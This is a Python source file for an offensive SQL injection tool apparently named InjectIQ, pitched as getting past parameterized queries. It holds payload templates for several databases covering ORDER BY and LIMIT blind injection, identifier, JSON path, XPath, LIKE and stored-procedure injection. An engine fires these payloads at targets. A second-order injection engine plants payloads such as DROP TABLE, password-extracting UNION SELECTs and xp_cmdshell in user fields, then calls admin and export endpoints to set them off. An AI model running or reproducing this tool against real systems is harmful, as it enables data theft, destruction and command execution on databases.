"""
InjectIQ Parameterized Query Bypass Engine
sqlmap CANNOT bypass parameterized queries. InjectIQ can via:

1. Second-order injection: inject into stored data that's later used unsanitized
2. ORDER BY blind: ORDER BY clauses often aren't parameterized
3. LIMIT/OFFSET blind: pagination clauses often bypass prepared statements
4. Table/column identifiers: can't be parameterized in prepared statements
5. Stored procedure injection: dynamic SQL inside procedures
6. JSON/XML function injection: JSON_PATH, XPath often not parameterized
7. LIKE pattern injection: pattern wildcards often unsanitized
"""
import re
from enum import Enum
from typing import Optional


class BypassTechnique(Enum):
    SECOND_ORDER = "second_order"
    ORDER_BY_BLIND = "order_by_blind"
    LIMIT_OFFSET_BLIND = "limit_offset_blind"
    IDENTIFIER_INJECTION = "identifier_injection"
    STORED_PROCEDURE = "stored_procedure"
    JSON_PATH_INJECTION = "json_path_injection"
    XPATH_INJECTION = "xpath_injection"
    LIKE_PATTERN_INJECTION = "like_pattern_injection"


# Payloads specifically designed for parameterized query bypass
# These target SQL contexts that CANNOT be parameterized

PARAM_BYPASS_PAYLOADS = {
    # ─── ORDER BY blind — column position in ORDER BY can't be parameterized ───
    "order_by_blind": {
        "mysql": [
            # ORDER BY 1 vs ORDER BY (SELECT 1 FROM (SELECT SLEEP(5))a)
            "ORDER BY (SELECT IF(({condition}),{true_col},{false_col}))",
            "ORDER BY (SELECT CASE WHEN ({condition}) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
            "ORDER BY IF(({condition}),1,(SELECT 1 FROM information_schema.tables))",
        ],
        "postgresql": [
            "ORDER BY (SELECT CASE WHEN ({condition}) THEN 1 ELSE 1/0 END)",
            "ORDER BY (SELECT NULLIF(1,CASE WHEN ({condition}) THEN 0 ELSE 1 END))",
        ],
        "mssql": [
            "ORDER BY (SELECT CASE WHEN ({condition}) THEN 1 ELSE 1/0 END)",
            "ORDER BY (SELECT IIF(({condition}),1,(SELECT 1 UNION SELECT 2)))",
        ],
    },

    # ─── LIMIT/OFFSET blind — pagination values often not parameterized ───
    "limit_offset_blind": {
        "mysql": [
            "LIMIT 0,IF(({condition}),1,(SELECT 1 FROM information_schema.tables))",
            "LIMIT IF(({condition}),1,0),1",
            ",(SELECT IF(({condition}),1,SLEEP(5)))",
        ],
        "postgresql": [
            "LIMIT (SELECT CASE WHEN ({condition}) THEN 1 ELSE 1/0 END)",
            "OFFSET (SELECT CASE WHEN ({condition}) THEN 0 ELSE 1/0 END)",
        ],
        "mssql": [
            "OFFSET (SELECT CASE WHEN ({condition}) THEN 0 ELSE 1/0 END) ROWS",
        ],
    },

    # ─── Identifier injection — table/column names can't be parameterized ───
    "identifier_injection": {
        "mysql": [
            # Inject into table name in FROM clause
            "FROM (SELECT {query}) AS injectiq",
            "FROM (SELECT * FROM {table} WHERE 1=1) AS injectiq",
            # Inject into column name in SELECT
            "(SELECT {query}) AS injectiq_col",
        ],
        "postgresql": [
            "FROM (SELECT {query}) AS injectiq",
            "FROM generate_series(1,(SELECT LENGTH(({query})))) AS injectiq",
        ],
        "mssql": [
            "FROM (SELECT {query}) AS injectiq(n)",
            "FROM OPENROWSET('SQLOLEDB','';'a';'a','{query}') AS injectiq",
        ],
    },

    # ─── JSON path injection — MySQL 5.7+, PostgreSQL JSONB ───
    "json_path_injection": {
        "mysql": [
            # JSON_EXTRACT path isn't parameterized
            "JSON_EXTRACT(data,'$.{injection}')",
            "JSON_CONTAINS_PATH(data,'one','$.{injection}')",
            "JSON_SEARCH(data,'one','{injection}')",
            "JSON_TABLE(data,'$.{injection}' COLUMNS(val VARCHAR(255) PATH '$'))",
        ],
        "postgresql": [
            "jsonb_path_query(data,'$.{injection}')",
            "jsonb_path_exists(data,'$.{injection}')",
            "jsonpath_in(data,'$.*.{injection}')",
        ],
    },

    # ─── XPath injection — XML functions not parameterized ───
    "xpath_injection": {
        "mysql": [
            "EXTRACTVALUE(xml,'/{injection}')",
            "UPDATEXML(xml,'/{injection}','')",
        ],
        "postgresql": [
            "xpath('/{injection}',xml)",
            "xmlexists('/{injection}' PASSING xml)",
        ],
        "mssql": [
            "SELECT xml.value('({injection})','varchar(max)')",
        ],
        "oracle": [
            "EXTRACT(xml,'/{injection}')",
            "XMLTYPE.createXML('{injection}')",
        ],
    },

    # ─── LIKE pattern injection — wildcards in LIKE not parameterized ───
    "like_pattern_injection": {
        "mysql": [
            "LIKE '%{injection}%'",
            "RLIKE '{injection}'",
            "REGEXP '{injection}'",
        ],
        "postgresql": [
            "LIKE '%{injection}%'",
            "SIMILAR TO '{injection}'",
            "~ '{injection}'",
        ],
    },

    # ─── Stored procedure dynamic SQL ───
    "stored_procedure": {
        "mssql": [
            "EXEC sp_executesql N'{injection}'",
            "EXEC(@sql)",  # Where @sql contains user input
        ],
        "mysql": [
            "PREPARE stmt FROM '{injection}'; EXECUTE stmt;",
            "CALL {procedure}('{injection}')",
        ],
        "postgresql": [
            "EXECUTE format('{injection}')",
            "PERFORM {injection}",
        ],
        "oracle": [
            "EXECUTE IMMEDIATE '{injection}'",
            "DBMS_SQL.PARSE(cursor,'{injection}',1)",
        ],
    },
}


class ParameterizedBypassEngine:
    """Bypass parameterized queries using contexts that can't be parameterized.
    
    sqlmap's approach: Try standard injection → if blocked, give up.
    InjectIQ's approach: Try standard injection → if blocked, try ORDER BY →
    LIMIT/OFFSET → identifier → JSON path → XPath → LIKE → stored procedure.
    """

    def __init__(self):
        self.attempted = []
        self.successful = []

    def generate_payloads(self, dbms: str, condition: str = "1=1",
                          query: str = "SELECT 1") -> list[dict]:
        """Generate parameterized query bypass payloads for given DBMS."""
        payloads = []

        for technique_name, dbms_payloads in PARAM_BYPASS_PAYLOADS.items():
            if dbms not in dbms_payloads:
                continue

            for template in dbms_payloads[dbms]:
                if isinstance(template, set):
                    continue  # Skip malformed entries
                try:
                    payload = template.format(
                        condition=condition,
                        query=query,
                        true_col="1",
                        false_col="999",
                        injection=query,
                        table="users",
                        procedure="sp_test",
                    )
                    payloads.append({
                        "technique": technique_name,
                        "payload": payload,
                        "bypass_type": BypassTechnique(technique_name).value,
                    })
                except (KeyError, IndexError):
                    continue

        return payloads

    def get_injection_contexts(self, original_query: str) -> list[dict]:
        """Analyze the original SQL query to find non-parameterizable contexts.
        Returns list of injection opportunities that bypass prepared statements."""
        contexts = []

        # ORDER BY context
        if re.search(r'\bORDER\s+BY\b', original_query, re.I):
            contexts.append({
                "context": "order_by",
                "technique": BypassTechnique.ORDER_BY_BLIND,
                "description": "ORDER BY column position can't be parameterized",
                "confidence": 0.8,
            })

        # LIMIT/OFFSET context
        if re.search(r'\b(LIMIT|OFFSET|FETCH)\b', original_query, re.I):
            contexts.append({
                "context": "limit_offset",
                "technique": BypassTechnique.LIMIT_OFFSET_BLIND,
                "description": "LIMIT/OFFSET values often not parameterized",
                "confidence": 0.7,
            })

        # LIKE/RLIKE/REGEXP context
        if re.search(r'\b(LIKE|RLIKE|REGEXP|SIMILAR\s+TO)\b', original_query, re.I):
            contexts.append({
                "context": "like_pattern",
                "technique": BypassTechnique.LIKE_PATTERN_INJECTION,
                "description": "LIKE pattern wildcards not parameterized",
                "confidence": 0.75,
            })

        # JSON function context
        if re.search(r'\b(JSON_EXTRACT|JSON_CONTAINS|JSON_PATH|jsonb_path)\b', original_query, re.I):
            contexts.append({
                "context": "json_path",
                "technique": BypassTechnique.JSON_PATH_INJECTION,
                "description": "JSON path expressions not parameterized",
                "confidence": 0.85,
            })

        # XML/XPath context
        if re.search(r'\b(EXTRACTVALUE|UPDATEXML|xpath|XMLTYPE|xml\.value)\b', original_query, re.I):
            contexts.append({
                "context": "xpath",
                "technique": BypassTechnique.XPATH_INJECTION,
                "description": "XPath expressions not parameterized",
                "confidence": 0.85,
            })

        # Dynamic SQL in stored procedures
        if re.search(r'\b(EXEC|EXECUTE|PREPARE|sp_executesql|DBMS_SQL)\b', original_query, re.I):
            contexts.append({
                "context": "stored_procedure",
                "technique": BypassTechnique.STORED_PROCEDURE,
                "description": "Dynamic SQL in stored procedures not parameterized",
                "confidence": 0.9,
            })

        # Table/column identifier context (always present)
        contexts.append({
            "context": "identifier",
            "technique": BypassTechnique.IDENTIFIER_INJECTION,
            "description": "Table/column identifiers can't be parameterized",
            "confidence": 0.6,
        })

        return contexts

    async def try_bypass(self, dbms: str, original_query: str,
                         inject_func, condition: str = "1=1") -> Optional[dict]:
        """Try all parameterized query bypass techniques.
        inject_func(payload) → response or None"""
        contexts = self.get_injection_contexts(original_query)
        payloads = self.generate_payloads(dbms, condition)

        for p in payloads:
            technique = p["technique"]
            payload = p["payload"]

            # Only try payloads matching detected contexts
            matching_contexts = [c for c in contexts if c["technique"].value == technique]
            if not matching_contexts and technique != "identifier_injection":
                continue

            self.attempted.append(payload)
            result = await inject_func(payload)

            if result and result.get("is_different"):
                self.successful.append({
                    "technique": technique,
                    "payload": payload,
                    "evidence": result,
                })
                return {
                    "bypass_found": True,
                    "technique": technique,
                    "payload": payload,
                    "evidence": result,
                }

        return {"bypass_found": False, "attempted": len(self.attempted)}


# ─── Second-Order Injection Engine ─────────────────────────────
# sqlmap has no second-order injection capability. This is novel.

class SecondOrderEngine:
    """Second-order SQL injection: inject into stored data that's later
    used unsanitized in another query.
    
    Example: Register with username: admin'-- 
    → Stored in DB → Later used in: SELECT * FROM users WHERE name='admin'--'
    → Second query is injectable even though first was parameterized.
    """

    # Common second-order injection patterns
    STORAGE_POINTS = {
        "registration": {
            "fields": ["username", "email", "display_name", "bio"],
            "payloads": [
                "admin'--",
                "admin' OR '1'='1",
                "admin'; DROP TABLE users--",
                "admin' UNION SELECT password FROM admins--",
                "admin\\",  # Escape character abuse
            ],
        },
        "profile_update": {
            "fields": ["first_name", "last_name", "nickname", "address"],
            "payloads": [
                "' OR 1=1--",
                "'; EXEC xp_cmdshell 'whoami'--",
                "' UNION SELECT password FROM users WHERE username='admin'--",
            ],
        },
        "comment_post": {
            "fields": ["comment", "title", "author_name"],
            "payloads": [
                "' OR 1=1--",
                "test' || (SELECT password FROM users LIMIT 1) ||'",
                "test' + (SELECT TOP 1 password FROM users) + '",
            ],
        },
        "search_history": {
            "fields": ["search_query", "filter_value"],
            "payloads": [
                "' UNION SELECT table_name FROM information_schema.tables--",
                "'; WAITFOR DELAY '0:0:5'--",
            ],
        },
    }

    # Trigger points — where stored data is used unsanitized
    TRIGGER_POINTS = [
        "/api/admin/users",          # Admin panel reads stored usernames
        "/api/search",               # Search uses stored filter values
        "/api/export",               # Export uses stored queries
        "/api/reports/generate",     # Report generation uses stored data
        "/api/password/reset",       # Password reset uses stored email
        "/api/user/profile",         # Profile display uses stored data
    ]

    def __init__(self):
        self.stored_payloads = []

    async def inject_and_trigger(self, storage_url: str, storage_fields: dict,
                                 trigger_url: str, inject_func) -> list[dict]:
        """Inject payloads into storage points, then trigger their use."""
        results = []

        for point_name, config in self.STORAGE_POINTS.items():
            for field in config["fields"]:
                if field not in storage_fields:
                    continue

                for payload in config["payloads"]:
                    # Step 1: Store the payload
                    store_data = {**storage_fields, field: payload}
                    store_result = await inject_func(storage_url, store_data)

                    if store_result and store_result.get("success"):
                        self.stored_payloads.append({
                            "point": point_name,
                            "field": field,
                            "payload": payload,
                        })

                        # Step 2: Trigger the stored payload
                        for trigger in self.TRIGGER_POINTS:
                            trigger_result = await inject_func(
                                f"{trigger_url}{trigger}", {}
                            )
                            if trigger_result and trigger_result.get("is_different"):
                                results.append({
                                    "type": "second_order",
                                    "storage_point": point_name,
                                    "field": field,
                                    "payload": payload,
                                    "trigger": trigger,
                                    "evidence": trigger_result,
                                })
                                break

        return results
